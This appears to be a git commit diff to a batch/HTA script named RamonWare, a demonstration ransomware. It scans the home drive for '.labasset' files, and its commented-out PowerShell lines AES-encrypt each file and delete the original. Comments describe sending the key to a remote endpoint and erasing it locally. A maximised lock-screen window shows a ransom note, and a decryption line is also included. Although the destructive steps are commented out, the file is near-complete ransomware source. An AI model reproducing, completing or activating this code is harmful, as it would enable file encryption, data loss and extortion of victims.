17407a0f4b5292481ec00f1cbbf24519429bc2e3
SegoCode <35817798+SegoCode@users.noreply.github.com>
2026-09-02 15:41:19 +0200

    Update Ramonware.bat

--- code/Ramonware.bat
+++ code/Ramonware.bat
@@ -2,7 +2,7 @@
 @Echo OFF
 mode con:cols=50 lines=2
 
-Title Ramon Ware
+Title RamonWare
 
 echo Scanning. . . .
 
@@ -10,13 +10,11 @@ REM Scan only: list matching files. Nothing is encrypted or deleted.
 set ROOT_PATH=%homedrive%\
 FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
     echo %%X >> %homedrive%\Original.txt
-    REM Encryption would happen here. Each listed file would be encrypted
-    REM and the original would be deleted, so the owner could not open it.
-    REM This step is not implemented: the script only finds files and logs them.
-    REM PowerShell AES (uncomment to activate). Encrypts the file; del removes the original.
-    REM The password should be generated on this machine, sent to a remote endpoint, then erased from the PC. It must not stay stored locally.
-    REM powershell -NoProfile -Command "function Protect-LabFile($Path,$Pass){ $aes=[Security.Cryptography.Aes]::Create(); $aes.Key=[Security.Cryptography.Rfc2898DeriveBytes]::new($Pass,[byte[]](1..16),10000).GetBytes(32); $aes.GenerateIV(); $b=[IO.File]::ReadAllBytes($Path); $c=$aes.CreateEncryptor().TransformFinalBlock($b,0,$b.Length); [IO.File]::WriteAllBytes($Path+'.aes',$aes.IV+$c) }; Protect-LabFile '%%X' '%pass%'"
+    REM Uncomment to AES-encrypt each file and delete the original.
+    REM Generate %pass% here, send it out, then erase it from this PC.
+    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $a.GenerateIV(); $b=[IO.File]::ReadAllBytes('%%X'); [IO.File]::WriteAllBytes('%%X.aes',$a.IV+$a.CreateEncryptor().TransformFinalBlock($b,0,$b.Length))"
     REM del "%%X"
+    REM powershell -NoProfile -Command "$a=[Security.Cryptography.Aes]::Create(); $a.Key=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%pass%')); $d=[IO.File]::ReadAllBytes('%%X.aes'); $a.IV=[byte[]]($d[0..15]); [IO.File]::WriteAllBytes('%%X',$a.CreateDecryptor().TransformFinalBlock($d,16,$d.Length-16))"
 )
 
 cls
@@ -26,35 +24,42 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 -->
 
 <html>
-    <head>
-        <title>RamonWare</title>
-    <hta:application id="lockScreen" 
-                     applicationname="RamonWare"  
-                     version="1.0" 
-                     maximizebutton="no" 
-                     minimizebutton="no" 
-                     sysmenu="no" 
-                     Caption="no" 
-                     windowstate="maximize"/> 
+<head>
+    <title>RamonWare</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=9">
+    <hta:application id="ramonWare"
+                     applicationname="RamonWare"
+                     version="1.0"
+                     maximizebutton="no"
+                     minimizebutton="no"
+                     sysmenu="no"
+                     caption="no"
+                     windowstate="maximize"/>
     <style>
-        #ransomNote{
+        html, body {
+            margin: 0;
+            height: 100%;
+            overflow: hidden;
+            background: #8c1d1d;
+            color: #fff;
+            font: 16px "Lucida Console", monospace;
+        }
+        #title {
+            text-align: center;
+            letter-spacing: 1px;
+        }
+        #message {
             padding-top: 19%;
             letter-spacing: 1px;
             text-align: center;
         }
     </style>
 </head>
-<body bgcolor="#8c1d1d" scroll="no">
-    <font face="Lucida Console" size="4" color="white">
-<center><p> - RamonWare - </p></center>
-<div id="ransomNote">
-    Ooops, your files have been encrypted!<br>
-    <br><br>
-    Your important files are encrypted. Nobody can get back your files without our decryption service.<br>
-    <br><br>
-   Github.com/SegoCode<br>
-    <br><br><br>
-    <img id="lockIcon" alt="Lock" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
-</div>
+<body>
+    <p id="title"> - RamonWare - </p>
+    <div id="message">
+        Ooops, your files have been encrypted!<br><br><br>
+        Github.com/SegoCode<br>
+    </div>
 </body>
 </html>
